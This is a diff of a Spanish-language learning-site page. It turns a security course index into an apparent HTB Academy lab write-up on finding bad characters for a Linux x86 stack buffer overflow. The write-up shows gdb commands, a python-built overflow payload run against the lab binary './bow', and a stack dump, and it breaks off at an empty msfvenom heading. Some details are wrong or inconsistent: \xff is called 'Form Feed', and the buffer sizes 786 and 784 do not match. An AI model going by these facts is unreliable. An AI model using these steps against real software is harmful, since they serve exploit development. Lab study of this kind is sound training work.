@@ -6,9 +6,8 @@
 
 <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
 
-<meta name="description" content="Cursos y laboratorios de ciberseguridad">
 
-<title>Security – DevOps &amp; Security Learning Journey</title>
+<title>bad-characters – DevOps &amp; Security Learning Journey</title>
 <style>
 code{white-space: pre-wrap;}
 span.smallcaps{font-variant: small-caps;}
@@ -21,27 +20,62 @@ ul.task-list li input[type="checkbox"] {
   margin: 0 0.8em 0.2em -1em; /* quarto-specific, see https://github.com/quarto-dev/quarto-cli/issues/4556 */ 
   vertical-align: middle;
 }
+/* CSS for syntax highlighting */
+html { -webkit-text-size-adjust: 100%; }
+pre > code.sourceCode { white-space: pre; position: relative; }
+pre > code.sourceCode > span { display: inline-block; line-height: 1.25; }
+pre > code.sourceCode > span:empty { height: 1.2em; }
+.sourceCode { overflow: visible; }
+code.sourceCode > span { color: inherit; text-decoration: inherit; }
+div.sourceCode { margin: 1em 0; }
+pre.sourceCode { margin: 0; }
+@media screen {
+div.sourceCode { overflow: auto; }
+}
+@media print {
+pre > code.sourceCode { white-space: pre-wrap; }
+pre > code.sourceCode > span { text-indent: -5em; padding-left: 5em; }
+}
+pre.numberSource code
+  { counter-reset: source-line 0; }
+pre.numberSource code > span
+  { position: relative; left: -4em; counter-increment: source-line; }
+pre.numberSource code > span > a:first-child::before
+  { content: counter(source-line);
+    position: relative; left: -1em; text-align: right; vertical-align: baseline;
+    border: none; display: inline-block;
+    -webkit-touch-callout: none; -webkit-user-select: none;
+    -khtml-user-select: none; -moz-user-select: none;
+    -ms-user-select: none; user-select: none;
+    padding: 0 4px; width: 4em;
+  }
+pre.numberSource { margin-left: 3em;  padding-left: 4px; }
+div.sourceCode
+  {   }
+@media screen {
+pre > code.sourceCode > span > a:first-child::before { text-decoration: underline; }
+}
 </style>
 
 
-<script src="../site_libs/quarto-nav/quarto-nav.js"></script>
-<script src="../site_libs/quarto-nav/headroom.min.js"></script>
-<script src="../site_libs/clipboard/clipboard.min.js"></script>
-<script src="../site_libs/quarto-search/autocomplete.umd.js"></script>
-<script src="../site_libs/quarto-search/fuse.min.js"></script>
-<script src="../site_libs/quarto-search/quarto-search.js"></script>
-<meta name="quarto:offset" content="../">
-<script src="../site_libs/quarto-html/quarto.js" type="module"></script>
-<script src="../site_libs/quarto-html/tabsets/tabsets.js" type="module"></script>
-<script src="../site_libs/quarto-html/axe/axe-check.js" type="module"></script>
-<script src="../site_libs/quarto-html/popper.min.js"></script>
-<script src="../site_libs/quarto-html/tippy.umd.min.js"></script>
-<script src="../site_libs/quarto-html/anchor.min.js"></script>
-<link href="../site_libs/quarto-html/tippy.css" rel="stylesheet">
-<link href="../site_libs/quarto-html/quarto-syntax-highlighting-dark-7ac2f9da8c2617a4fdd15004b4601015.css" rel="stylesheet" id="quarto-text-highlighting-styles">
-<script src="../site_libs/bootstrap/bootstrap.min.js"></script>
-<link href="../site_libs/bootstrap/bootstrap-icons.css" rel="stylesheet">
-<link href="../site_libs/bootstrap/bootstrap-3dad1a9f078d91cda5f1887d21eb11b5.min.css" rel="stylesheet" append-hash="true" id="quarto-bootstrap" data-mode="dark">
+<script src="../../site_libs/quarto-nav/quarto-nav.js"></script>
+<script src="../../site_libs/quarto-nav/headroom.min.js"></script>
+<script src="../../site_libs/clipboard/clipboard.min.js"></script>
+<script src="../../site_libs/quarto-search/autocomplete.umd.js"></script>
+<script src="../../site_libs/quarto-search/fuse.min.js"></script>
+<script src="../../site_libs/quarto-search/quarto-search.js"></script>
+<meta name="quarto:offset" content="../../">
+<script src="../../site_libs/quarto-html/quarto.js" type="module"></script>
+<script src="../../site_libs/quarto-html/tabsets/tabsets.js" type="module"></script>
+<script src="../../site_libs/quarto-html/axe/axe-check.js" type="module"></script>
+<script src="../../site_libs/quarto-html/popper.min.js"></script>
+<script src="../../site_libs/quarto-html/tippy.umd.min.js"></script>
+<script src="../../site_libs/quarto-html/anchor.min.js"></script>
+<link href="../../site_libs/quarto-html/tippy.css" rel="stylesheet">
+<link href="../../site_libs/quarto-html/quarto-syntax-highlighting-dark-7ac2f9da8c2617a4fdd15004b4601015.css" rel="stylesheet" id="quarto-text-highlighting-styles">
+<script src="../../site_libs/bootstrap/bootstrap.min.js"></script>
+<link href="../../site_libs/bootstrap/bootstrap-icons.css" rel="stylesheet">
+<link href="../../site_libs/bootstrap/bootstrap-3dad1a9f078d91cda5f1887d21eb11b5.min.css" rel="stylesheet" append-hash="true" id="quarto-bootstrap" data-mode="dark">
 <script id="quarto-search-options" type="application/json">{
   "location": "navbar",
   "copy-button": false,
@@ -80,7 +114,7 @@ ul.task-list li input[type="checkbox"] {
     <nav class="navbar navbar-expand-lg " data-bs-theme="dark">
       <div class="navbar-container container-fluid">
       <div class="navbar-brand-container mx-auto">
-    <a class="navbar-brand" href="../index.html">
+    <a class="navbar-brand" href="../../index.html">
     <span class="navbar-title">DevOps &amp; Security Learning Journey</span>
     </a>
   </div>
@@ -91,27 +125,27 @@ ul.task-list li input[type="checkbox"] {
           <div class="collapse navbar-collapse" id="navbarCollapse">
             <ul class="navbar-nav navbar-nav-scroll me-auto">
   <li class="nav-item">
-    <a class="nav-link" href="../index.html"> 
+    <a class="nav-link" href="../../index.html"> 
 <span class="menu-text">Home</span></a>
   </li>  
   <li class="nav-item">
-    <a class="nav-link" href="../foundations/index.html"> 
+    <a class="nav-link" href="../../foundations/index.html"> 
 <span class="menu-text">Foundations</span></a>
   </li>  
   <li class="nav-item">
-    <a class="nav-link" href="../containers/index.html"> 
+    <a class="nav-link" href="../../containers/index.html"> 
 <span class="menu-text">Containers</span></a>
   </li>  
   <li class="nav-item">
-    <a class="nav-link" href="../devops-practices/index.html"> 
+    <a class="nav-link" href="../../devops-practices/index.html"> 
 <span class="menu-text">DevOps</span></a>
   </li>  
   <li class="nav-item">
-    <a class="nav-link active" href="../security/index.html" aria-current="page"> 
+    <a class="nav-link" href="../../security/index.html"> 
 <span class="menu-text">Security</span></a>
   </li>  
   <li class="nav-item">
-    <a class="nav-link" href="../roadmap/index.html"> 
+    <a class="nav-link" href="../../roadmap/index.html"> 
 <span class="menu-text">Roadmap</span></a>
   </li>  
 </ul>
@@ -122,11 +156,11 @@ ul.task-list li input[type="checkbox"] {
     </a>
     <ul class="dropdown-menu dropdown-menu-end" aria-labelledby="nav-menu-language">    
         <li>
-    <a class="dropdown-item" href="../es/index.html">
+    <a class="dropdown-item" href="../../es/index.html">
  <span class="dropdown-text">Español</span></a>
   </li>  
         <li>
-    <a class="dropdown-item" href="../index.html">
+    <a class="dropdown-item" href="../../index.html">
  <span class="dropdown-text">English</span></a>
   </li>  
     </ul>
@@ -152,365 +186,164 @@ ul.task-list li input[type="checkbox"] {
     <h2 id="toc-title">On this page</h2>
    
   <ul>
-  <li><a href="#security" id="toc-security" class="nav-link active" data-scroll-target="#security">Security</a>
+  <li><a href="#identification-of-bad-characters" id="toc-identification-of-bad-characters" class="nav-link active" data-scroll-target="#identification-of-bad-characters">Identification of Bad Characters</a>
   <ul class="collapse">
-  <li><a href="#cursos-disponibles" id="toc-cursos-disponibles" class="nav-link" data-scroll-target="#cursos-disponibles">Cursos Disponibles</a>
+  <li><a href="#bad-characters-comunes" id="toc-bad-characters-comunes" class="nav-link" data-scroll-target="#bad-characters-comunes">Bad Characters Comunes</a></li>
+  <li><a href="#metodología-de-identificación" id="toc-metodología-de-identificación" class="nav-link" data-scroll-target="#metodología-de-identificación">Metodología de Identificación</a>
   <ul class="collapse">
-  <li><a href="#network-enumeration-with-nmap" id="toc-network-enumeration-with-nmap" class="nav-link" data-scroll-target="#network-enumeration-with-nmap">Network Enumeration with Nmap</a></li>
-  <li><a href="#web-requests---http-fundamentals" id="toc-web-requests---http-fundamentals" class="nav-link" data-scroll-target="#web-requests---http-fundamentals">Web Requests - HTTP Fundamentals</a></li>
-  <li><a href="#ffuf---web-fuzzing" id="toc-ffuf---web-fuzzing" class="nav-link" data-scroll-target="#ffuf---web-fuzzing">FFUF - Web Fuzzing</a></li>
-  <li><a href="#stack-based-buffer-overflows-on-linux-x86" id="toc-stack-based-buffer-overflows-on-linux-x86" class="nav-link" data-scroll-target="#stack-based-buffer-overflows-on-linux-x86">Stack-Based Buffer Overflows on Linux x86</a></li>
-  <li><a href="#pentagi---pentesting-con-ia" id="toc-pentagi---pentesting-con-ia" class="nav-link" data-scroll-target="#pentagi---pentesting-con-ia">PentAGI - Pentesting con IA</a></li>
-  <li><a href="#roadmap-de-junior-a-pentester-employable" id="toc-roadmap-de-junior-a-pentester-employable" class="nav-link" data-scroll-target="#roadmap-de-junior-a-pentester-employable">Roadmap: De Junior a Pentester Employable</a></li>
+  <li><a href="#paso-1-crear-lista-de-todos-los-bytes" id="toc-paso-1-crear-lista-de-todos-los-bytes" class="nav-link" data-scroll-target="#paso-1-crear-lista-de-todos-los-bytes">Paso 1: Crear Lista de Todos los Bytes</a></li>
+  <li><a href="#paso-2-configurar-gdb" id="toc-paso-2-configurar-gdb" class="nav-link" data-scroll-target="#paso-2-configurar-gdb">Paso 2: Configurar GDB</a></li>
+  <li><a href="#paso-3-enviar-payload" id="toc-paso-3-enviar-payload" class="nav-link" data-scroll-target="#paso-3-enviar-payload">Paso 3: Enviar Payload</a></li>
+  <li><a href="#paso-4-examinar-stack" id="toc-paso-4-examinar-stack" class="nav-link" data-scroll-target="#paso-4-examinar-stack">Paso 4: Examinar Stack</a></li>
   </ul></li>
-  <li><a href="#laboratorios-completados" id="toc-laboratorios-completados" class="nav-link" data-scroll-target="#laboratorios-completados">Laboratorios Completados</a></li>
-  <li><a href="#habilidades-desarrolladas" id="toc-habilidades-desarrolladas" class="nav-link" data-scroll-target="#habilidades-desarrolladas">Habilidades Desarrolladas</a></li>
-  <li><a href="#otros-recursos-de-seguridad" id="toc-otros-recursos-de-seguridad" class="nav-link" data-scroll-target="#otros-recursos-de-seguridad">Otros Recursos de Seguridad</a>
-  <ul class="collapse">
-  <li><a href="#openvpn-setup" id="toc-openvpn-setup" class="nav-link" data-scroll-target="#openvpn-setup">OpenVPN Setup</a></li>
-  </ul></li>
-  <li><a href="#estadísticas-del-módulo" id="toc-estadísticas-del-módulo" class="nav-link" data-scroll-target="#estadísticas-del-módulo">Estadísticas del Módulo</a></li>
+  <li><a href="#análisis-de-resultados" id="toc-análisis-de-resultados" class="nav-link" data-scroll-target="#análisis-de-resultados">Análisis de Resultados</a></li>
+  <li><a href="#bad-characters-identificados" id="toc-bad-characters-identificados" class="nav-link" data-scroll-target="#bad-characters-identificados">Bad Characters Identificados</a></li>
+  <li><a href="#proceso-iterativo" id="toc-proceso-iterativo" class="nav-link" data-scroll-target="#proceso-iterativo">Proceso Iterativo</a></li>
+  <li><a href="#ajuste-del-buffer" id="toc-ajuste-del-buffer" class="nav-link" data-scroll-target="#ajuste-del-buffer">Ajuste del Buffer</a></li>
+  <li><a href="#uso-en-msfvenom" id="toc-uso-en-msfvenom" class="nav-link" data-scroll-target="#uso-en-msfvenom">Uso en msfvenom</a></li>
   </ul></li>
   </ul>
 </nav>
     </div>
 <!-- main -->
-<main class="content" id="quarto-document-content">
-
-<header id="title-block-header" class="quarto-title-block default">
-<div class="quarto-title">
-<h1 class="title">Security</h1>
-</div>
-
-<div>
-  <div class="description">
-    Cursos y laboratorios de ciberseguridad
-  </div>
-</div>
+<main class="content" id="quarto-document-content"><header id="title-block-header" class="quarto-title-block"></header>
 
 
-<div class="quarto-title-meta">
-
-    
-  
-    
-  </div>
-  
 
 
-</header>
-
-
-<section id="security" class="level1">
-<h1>Security</h1>
-<p>Bienvenido a la sección de <strong>Ciberseguridad</strong>. Aquí encontrarás cursos completos desde fundamentos hasta técnicas avanzadas de pentesting.</p>
-<section id="cursos-disponibles" class="level2">
-<h2 class="anchored" data-anchor-id="cursos-disponibles">Cursos Disponibles</h2>
-<section id="network-enumeration-with-nmap" class="level3">
-<h3 class="anchored" data-anchor-id="network-enumeration-with-nmap">Network Enumeration with Nmap</h3>
-<p>Curso completo de enumeración de redes con Nmap, desde conceptos básicos hasta técnicas avanzadas de evasión de firewalls e IDS/IPS.</p>
-<p><a href="nmap-course/index.html"><strong>Acceder al Curso de Nmap →</strong></a></p>
-<p><strong>Contenido del curso:</strong></p>
-<ul>
-<li>Introducción a Nmap y arquitectura</li>
-<li>Host Discovery y Port Scanning</li>
-<li>Service Enumeration y NSE Scripts</li>
-<li>Firewall &amp; IDS/IPS Evasion (3 laboratorios HTB)</li>
-<li>6 laboratorios prácticos completados</li>
-</ul>
-<p><strong>Progreso del curso:</strong> 100% ✅</p>
-<hr>
-</section>
-<section id="web-requests---http-fundamentals" class="level3">
-<h3 class="anchored" data-anchor-id="web-requests---http-fundamentals">Web Requests - HTTP Fundamentals</h3>
-<p>Curso completo de HTTP y cURL desde HTB Academy. Aprende los fundamentos del protocolo HTTP, HTTPS, headers, métodos HTTP y CRUD APIs.</p>
-<p><a href="web-requests/index.html"><strong>Acceder al Curso de Web Requests →</strong></a></p>
-<p><strong>Contenido del curso:</strong></p>
-<ul>
-<li>HTTP Fundamentals y protocolo</li>
-<li>HTTPS y SSL/TLS</li>
-<li>HTTP Requests &amp; Responses</li>
-<li>HTTP Headers y autenticación</li>
-<li>HTTP Methods (GET, POST, PUT, DELETE)</li>
-<li>CRUD API con cURL</li>
-<li>8 laboratorios prácticos completados</li>
-</ul>
-<p><strong>Progreso del curso:</strong> 100% ✅</p>
-<p><strong>Flags obtenidas:</strong></p>
+<section id="identification-of-bad-characters" class="level1">
+<h1>Identification of Bad Characters</h1>
+<p>Los bad characters son bytes que interrumpen o alteran el payload. Debemos identificarlos para generar shellcode válido.</p>
+<section id="bad-characters-comunes" class="level2">
+<h2 class="anchored" data-anchor-id="bad-characters-comunes">Bad Characters Comunes</h2>
 <table class="caption-top table">
 <thead>
 <tr class="header">
-<th>Flag</th>
-<th>Sección</th>
+<th>Byte</th>
+<th>Nombre</th>
+<th>Razón</th>
 </tr>
 </thead>
 <tbody>
 <tr class="odd">
-<td><code>HTB{64$!c_cURL_u$3r}</code></td>
-<td>HTTP Basics</td>
+<td><code>\x00</code></td>
+<td>Null Byte</td>
+<td>Termina strings en C</td>
 </tr>
 <tr class="even">
-<td><code>HTB{p393_r3qu3$t$_m0n!t0r}</code></td>
-<td>HTTP Headers</td>
+<td><code>\x09</code></td>
+<td>Tab</td>
+<td>Problemas con argumentos</td>
 </tr>
 <tr class="odd">
-<td><code>HTB{curl_g3773r}</code></td>
-<td>GET Method</td>
+<td><code>\x0a</code></td>
+<td>Line Feed</td>
+<td>Termina líneas</td>
 </tr>
 <tr class="even">
-<td><code>HTB{p0$t_r3p34t3r}</code></td>
-<td>POST Method</td>
+<td><code>\x0d</code></td>
+<td>Carriage Return</td>
+<td>Problemas de entrada</td>
 </tr>
 <tr class="odd">
-<td><code>HTB{crud_4p!_m4n!pul4t0r}</code></td>
-<td>CRUD API</td>
+<td><code>\x20</code></td>
+<td>Space</td>
+<td>Problemas con argumentos</td>
+</tr>
+<tr class="even">
+<td><code>\xff</code></td>
+<td>Form Feed</td>
+<td>Problemas de formato</td>
 </tr>
 </tbody>
 </table>
-<p><strong>Achievement:</strong> https://academy.hackthebox.com/achievement/2300153/35</p>
-<hr>
 </section>
-<section id="ffuf---web-fuzzing" class="level3">
-<h3 class="anchored" data-anchor-id="ffuf---web-fuzzing">FFUF - Web Fuzzing</h3>
-<p>Curso completo de fuzzing web con FFUF desde HTB Academy. Aprende directory fuzzing, subdomain discovery, y parameter fuzzing.</p>
-<p><a href="ffuf-course/index.html"><strong>Acceder al Curso de FFUF →</strong></a></p>
-<p><strong>Contenido del curso:</strong></p>
-<ul>
-<li>Directory Fuzzing</li>
-<li>Subdomain Fuzzing</li>
-<li>Parameter Fuzzing</li>
-<li>12 ejercicios prácticos completados</li>
-</ul>
-<p><strong>Progreso del curso:</strong> 100% ✅</p>
-<p><strong>Achievement:</strong> https://academy.hackthebox.com/achievement/2300153/54</p>
-<hr>
+<section id="metodología-de-identificación" class="level2">
+<h2 class="anchored" data-anchor-id="metodología-de-identificación">Metodología de Identificación</h2>
+<section id="paso-1-crear-lista-de-todos-los-bytes" class="level3">
+<h3 class="anchored" data-anchor-id="paso-1-crear-lista-de-todos-los-bytes">Paso 1: Crear Lista de Todos los Bytes</h3>
+<div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb1"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true" tabindex="-1"></a><span class="va">CHARS</span><span class="op">=</span><span class="st">"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"</span></span></code></pre></div><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></div>
 </section>
-<section id="stack-based-buffer-overflows-on-linux-x86" class="level3">
-<h3 class="anchored" data-anchor-id="stack-based-buffer-overflows-on-linux-x86">Stack-Based Buffer Overflows on Linux x86</h3>
-<p>Curso completo de buffer overflows desde HTB Academy. Aprende arquitectura CPU, registros, desarrollo de exploits y generación de shellcode.</p>
-<p><a href="buffer-overflow-x86/index.html"><strong>Acceder al Curso de Buffer Overflow →</strong></a></p>
-<p><strong>Contenido del curso:</strong></p>
-<ul>
-<li>Buffer Overflows Overview</li>
-<li>Exploit Development Introduction</li>
-<li>CPU Architecture (Von-Neumann, ISA)</li>
-<li>Stack-Based Buffer Overflow</li>
-<li>CPU Registers (EIP, ESP, EBP)</li>
-<li>Take Control of EIP</li>
-<li>Determine Shellcode Length</li>
-<li>Identification of Bad Characters</li>
-<li>Generating Shellcode con msfvenom</li>
-<li>Return Address Calculation</li>
-<li>Proof-of-Concept Exploit</li>
-</ul>
-<p><strong>Progreso del curso:</strong> 69% (9/13 secciones)</p>
-<p><strong>Bad Characters identificados:</strong> <code>\x00\x09\x0a\x20</code></p>
-<p><strong>Offset determinado:</strong> 1036 bytes</p>
-<p><strong>Stack Size:</strong> 0x21000</p>
-<hr>
+<section id="paso-2-configurar-gdb" class="level3">
+<h3 class="anchored" data-anchor-id="paso-2-configurar-gdb">Paso 2: Configurar GDB</h3>
+<div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb2"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb2-1"><a href="#cb2-1" aria-hidden="true" tabindex="-1"></a><span class="fu">gdb</span> <span class="at">-q</span> ./bow</span>
+<span id="cb2-2"><a href="#cb2-2" aria-hidden="true" tabindex="-1"></a><span class="kw">(</span><span class="fu">gdb</span><span class="kw">)</span> <span class="cf">break</span> <span class="ex">bowfunc</span></span></code></pre></div><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></div>
 </section>
-<section id="pentagi---pentesting-con-ia" class="level3">
-<h3 class="anchored" data-anchor-id="pentagi---pentesting-con-ia">PentAGI - Pentesting con IA</h3>
-<p>Curso completo de pentesting automatizado con Inteligencia Artificial local, utilizando Ollama y Docker para máxima privacidad.</p>
-<p><a href="pentagi-course/index.html"><strong>Acceder al Curso de PentAGI →</strong></a></p>
-<p><strong>Contenido del curso:</strong></p>
-<ul>
-<li>Introducción a PentAGI y arquitectura</li>
-<li>Instalación y configuración con Ollama local</li>
-<li>Primeros pasos y mejores prácticas</li>
-<li>Seguridad y optimización</li>
-<li>Laboratorio práctico completo</li>
-</ul>
-<p><strong>Progreso del curso:</strong> 100% ✅</p>
-<p><strong>Filosofía: Seguridad por defecto</strong></p>
-<ul>
-<li>Sin APIs externas (todo local con Ollama)</li>
-<li>Sin credenciales expuestas</li>
-<li>Aislamiento completo con Docker</li>
-</ul>
-<hr>
+<section id="paso-3-enviar-payload" class="level3">
+<h3 class="anchored" data-anchor-id="paso-3-enviar-payload">Paso 3: Enviar Payload</h3>
+<div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb3"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb3-1"><a href="#cb3-1" aria-hidden="true" tabindex="-1"></a><span class="kw">(</span><span class="fu">gdb</span><span class="kw">)</span> <span class="ex">run</span> <span class="va">$(</span><span class="ex">python</span> <span class="at">-c</span> <span class="st">'print "\x55"*784 + "&lt;CHARS&gt;" + "\x66"*4'</span><span class="va">)</span></span></code></pre></div><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></div>
 </section>
-<section id="roadmap-de-junior-a-pentester-employable" class="level3">
-<h3 class="anchored" data-anchor-id="roadmap-de-junior-a-pentester-employable">Roadmap: De Junior a Pentester Employable</h3>
-<p>Plan completo de 16 semanas para conseguir empleo en ciberseguridad, usando estrategias gratuitas con HTB Academy, PentAGI y Bug Bounty.</p>
-<p><a href="../roadmap-pentesting.html"><strong>Ver Roadmap Completo →</strong></a></p>
-<p><strong>Contenido del roadmap:</strong></p>
-<ul>
-<li>Fase 1: Fundamentos + Perfil (Semanas 1-3)</li>
-<li>Fase 2: PentAGI + HTB Integration (Semanas 4-6)</li>
-<li>Fase 3: Desbloquear Módulos (Semanas 7-10)</li>
-<li>Fase 4: Labs + Portfolio (Semanas 11-14)</li>
-<li>Fase 5: Bug Bounty + Job Search (Semanas 15-16)</li>
-</ul>
-<p><strong>Incluye:</strong></p>
-<ul>
-<li>Tracker de cubos HTB</li>
-<li>CV Template para Pentester Junior</li>
-<li>Checklist semanal de progreso</li>
-<li>Estrategia de acumulación gratuita</li>
-</ul>
-<hr>
+<section id="paso-4-examinar-stack" class="level3">
+<h3 class="anchored" data-anchor-id="paso-4-examinar-stack">Paso 4: Examinar Stack</h3>
+<div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb4"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb4-1"><a href="#cb4-1" aria-hidden="true" tabindex="-1"></a><span class="kw">(</span><span class="fu">gdb</span><span class="kw">)</span> <span class="ex">x/300xb</span> <span class="va">$esp</span>+1100</span></code></pre></div><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></div>
 </section>
 </section>
-<section id="laboratorios-completados" class="level2">
-<h2 class="anchored" data-anchor-id="laboratorios-completados">Laboratorios Completados</h2>
+<section id="análisis-de-resultados" class="level2">
+<h2 class="anchored" data-anchor-id="análisis-de-resultados">Análisis de Resultados</h2>
+<p><strong>Esperado:</strong> Secuencia continua <code>\x01\x02\x03\x04...</code></p>
+<p><strong>Real encontrado:</strong></p>
+<pre><code>0xffffd6a0: 0x01 0x02 0x03 0x04 0x05 0x06 0x07 0x08 0x00 0x0b ...
+                                                      ↑
+                                              Debería ser 0x09
+
+0xffffd6c0: 0x1e 0x1f 0x00 0x21 ...
+                      ↑
+              Debería ser 0x20</code></pre>
+</section>
+<section id="bad-characters-identificados" class="level2">
+<h2 class="anchored" data-anchor-id="bad-characters-identificados">Bad Characters Identificados</h2>
 <table class="caption-top table">
 <thead>
 <tr class="header">
-<th>Reto</th>
-<th>Plataforma</th>
-<th>Dificultad</th>
-<th>Fecha</th>
-</tr>
-</thead>
-<tbody>
-<tr class="odd">
-<td>Nmap Default Scan</td>
-<td>HTB Academy</td>
-<td>Easy</td>
-<td>2026-02-11</td>
-</tr>
-<tr class="even">
-<td>Full Port Scan</td>
-<td>HTB Academy</td>
-<td>Easy</td>
-<td>2026-02-19</td>
-</tr>
-<tr class="odd">
-<td>Service Enumeration</td>
-<td>HTB Academy</td>
-<td>Easy</td>
-<td>2026-02-20</td>
-</tr>
-<tr class="even">
-<td>NSE Scripts</td>
-<td>HTB Academy</td>
-<td>Easy</td>
-<td>2026-02-20</td>
-</tr>
-<tr class="odd">
-<td>Firewall Evasion Easy</td>
-<td>HTB Academy</td>
-<td>Easy</td>
-<td>2026-02-20</td>
-</tr>
-<tr class="even">
-<td>Firewall Evasion Medium</td>
-<td>HTB Academy</td>
-<td>Medium</td>
-<td>2026-02-20</td>
-</tr>
-<tr class="odd">
-<td>Firewall Evasion Hard</td>
-<td>HTB Academy</td>
-<td>Hard</td>
-<td>2026-02-20</td>
-</tr>
-<tr class="even">
-<td>Buffer Overflow - EIP Control</td>
-<td>HTB Academy</td>
-<td>Medium</td>
-<td>2026-02-21</td>
-</tr>
-<tr class="odd">
-<td>Buffer Overflow - Bad Chars</td>
-<td>HTB Academy</td>
-<td>Medium</td>
-<td>2026-02-21</td>
-</tr>
-<tr class="even">
-<td>Buffer Overflow - Shellcode</td>
-<td>HTB Academy</td>
-<td>Medium</td>
-<td>2026-02-21</td>
-</tr>
-</tbody>
-</table>
-<hr>
-</section>
-<section id="habilidades-desarrolladas" class="level2">
-<h2 class="anchored" data-anchor-id="habilidades-desarrolladas">Habilidades Desarrolladas</h2>
-<table class="caption-top table">
-<thead>
-<tr class="header">
-<th>Habilidad</th>
-<th>Nivel</th>
-</tr>
-</thead>
-<tbody>
-<tr class="odd">
-<td>Host Discovery</td>
-<td>Avanzado</td>
-</tr>
-<tr class="even">
-<td>Port Scanning</td>
-<td>Avanzado</td>
-</tr>
-<tr class="odd">
-<td>Service Enumeration</td>
-<td>Avanzado</td>
-</tr>
-<tr class="even">
-<td>NSE Scripts</td>
-<td>Intermedio</td>
-</tr>
-<tr class="odd">
-<td>Firewall Evasion</td>
-<td>Avanzado</td>
-</tr>
-<tr class="even">
-<td>IDS/IPS Bypass</td>
-<td>Intermedio</td>
-</tr>
-<tr class="odd">
-<td>Buffer Overflow</td>
-<td>Intermedio</td>
-</tr>
-<tr class="even">
-<td>Shellcode Generation</td>
-<td>Intermedio</td>
-</tr>
-</tbody>
-</table>
-<hr>
-</section>
-<section id="otros-recursos-de-seguridad" class="level2">
-<h2 class="anchored" data-anchor-id="otros-recursos-de-seguridad">Otros Recursos de Seguridad</h2>
-<section id="openvpn-setup" class="level3">
-<h3 class="anchored" data-anchor-id="openvpn-setup">OpenVPN Setup</h3>
-<p>Guía completa de configuración de OpenVPN para conectar a HTB Academy desde Linux, macOS y Windows.</p>
-<p><a href="openvpn-setup.html">Ver guía de OpenVPN →</a></p>
-<hr>
-</section>
-</section>
-<section id="estadísticas-del-módulo" class="level2">
-<h2 class="anchored" data-anchor-id="estadísticas-del-módulo">Estadísticas del Módulo</h2>
-<table class="caption-top table">
-<thead>
-<tr class="header">
-<th>Métrica</th>
+<th>Byte</th>
 <th>Valor</th>
+<th>Evidencia</th>
 </tr>
 </thead>
 <tbody>
 <tr class="odd">
-<td>Laboratorios Completados</td>
-<td>18</td>
+<td><code>\x00</code></td>
+<td>Null Byte</td>
+<td>Aparece en lugar de <code>\x09</code> y <code>\x20</code></td>
 </tr>
 <tr class="even">
-<td>Flags Obtenidas</td>
-<td>8</td>
+<td><code>\x09</code></td>
+<td>Tab</td>
+<td>Faltante después de <code>\x08</code></td>
 </tr>
 <tr class="odd">
-<td>Módulos HTB Completados</td>
-<td>3</td>
+<td><code>\x0a</code></td>
+<td>Line Feed</td>
+<td>Faltante (salta a <code>\x0b</code>)</td>
 </tr>
 <tr class="even">
-<td>Módulos HTB En Progreso</td>
-<td>1</td>
+<td><code>\x20</code></td>
+<td>Space</td>
+<td>Faltante después de <code>\x1f</code></td>
 </tr>
 </tbody>
 </table>
+<p><strong>Respuesta:</strong> <code>\x00\x09\x0a\x20</code></p>
+</section>
+<section id="proceso-iterativo" class="level2">
+<h2 class="anchored" data-anchor-id="proceso-iterativo">Proceso Iterativo</h2>
+<ol type="1">
+<li>Identificar primer bad char</li>
+<li>Eliminar del payload</li>
+<li>Ajustar tamaño del buffer</li>
+<li>Repetir hasta encontrar todos</li>
+</ol>
+</section>
+<section id="ajuste-del-buffer" class="level2">
+<h2 class="anchored" data-anchor-id="ajuste-del-buffer">Ajuste del Buffer</h2>
+<pre><code>Buffer original: 786 bytes
+Después de eliminar 4 bad chars: 786 bytes (ya incluidos en CHARS)</code></pre>
+</section>
+<section id="uso-en-msfvenom" class="level2">
+<h2 class="anchored" data-anchor-id="uso-en-msfvenom">Uso en msfvenom</h2>
